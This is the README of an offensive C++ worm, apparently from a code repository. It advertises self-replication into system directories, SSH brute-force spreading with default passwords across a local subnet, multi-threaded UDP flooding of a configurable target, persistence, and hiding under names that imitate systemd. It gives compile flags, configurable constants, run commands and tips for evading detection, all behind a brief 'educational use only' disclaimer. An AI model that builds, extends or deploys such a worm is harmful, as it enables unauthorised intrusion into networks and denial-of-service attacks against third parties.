Master of Replication – C++ Worm

Standalone C++ Worm – Designed for rapid propagation, network infiltration, and large-scale DDoS simulation.

---

🎯 Role

Wide‑scale attacker – replicates aggressively, spreads across networks, and overwhelms targets with massive parallel traffic.

---

⚡ Capabilities

Ability Description
Infinite Replication Copies itself thousands of times to multiple system directories (/tmp, /var/tmp, /usr/local/bin, etc.) and executes each copy immediately.
Network Rush Scans local network (192.168.1.0/24) and attempts to propagate via SSH using a list of common default passwords (root, password, 123456, etc.).
Swarm Assault Launches a UDP flood attack against a specified target using multiple threads (20 by default) for high‑throughput DDoS simulation.
Rapid Expansion Uses multi‑threading to replicate, attack, and spread simultaneously, infecting multiple systems in parallel.
Self‑Propagation Runs in an infinite loop, automatically re‑executing all functions every minute without user intervention.

---

⚠️ Disclaimer

This code is for educational and authorized security testing purposes only.
Unauthorised use against systems you do not own or have explicit permission to test is illegal and may lead to severe legal consequences.
The author assumes no responsibility for any misuse.

---

📦 Requirements

· Compiler: g++ (C++11 or later)
· Build tools: make, binutils
· Optional for SSH spreading: sshpass (if you want to test the network propagation feature)

---

🔧 Compilation

```bash
g++ -O2 -Wall -pthread -o worm_replication worm_replication.cpp
```

· -O2 : optimisation for speed
· -Wall : show all warnings
· -pthread : enable threading (required for swarm assault)

---

⚙️ Configuration (Edit Constants Before Compilation)

Open worm_replication.cpp and modify these #define values:

```cpp
#define MAX_REPLICAS 10000           // max copies per replication cycle
#define NETWORK_RANGE "192.168.1."   // local network prefix
#define ATTACK_TARGET "8.8.8.8"      // target IP for swarm attack
#define SSH_PASSWORDS "root,password,123456,toor,admin,ubuntu,debian"
#define WORM_NAME ".systemd-net"     // hidden file name
#define WORKER_THREADS 20            // number of attack threads
```

---

▶️ Usage

1. Make it executable (if needed):
   ```bash
   chmod +x worm_replication
   ```
2. Run the worm:
   ```bash
   ./worm_replication
   ```
   The process will daemonise (run in the background) and start replicating, spreading, and attacking immediately.
3. Stop the worm:
   ```bash
   pkill -f worm_replication
   ```

---

🔍 Features in Detail

· Multi‑threaded replication – creates copies in parallel for speed.
· SSH brute‑force – uses a list of common passwords to spread across the local network.
· UDP flood – sustained attack using multiple threads (can be adjusted).
· Persistence – the worm runs indefinitely, re‑infecting every minute.
· Hidden operation – daemonises itself and uses a hidden flag file (/tmp/.worm_infected) to avoid re‑infecting the same host.

---

📁 Files Created by the Worm

· Copies of itself in various directories named .systemd-net_<number>.
· A flag file /tmp/.worm_infected to mark an infected system.

---

🛡️ Detection Evasion

· The worm runs as a daemon (background process).
· It uses common system directory names to hide its presence.
· Process names are not camouflaged by default (you may rename the binary to something like systemd-update to blend in).

---

📌 Notes

· Network propagation via SSH requires sshpass to be installed on the attacking machine (optional; remove that part if not needed).
· The swarm attack is a simulated DDoS – it sends UDP packets continuously. Adjust usleep() values to control intensity.
· For a stealthier approach, consider compiling with -static to produce a standalone binary without external dependencies.

---

📜 License

This project is provided for educational and research purposes only.
You are solely responsible for ensuring compliance with all applicable laws and regulations.

---

Developed by Ash Demon
Powered by C++ & the spirit of the digital darkness.
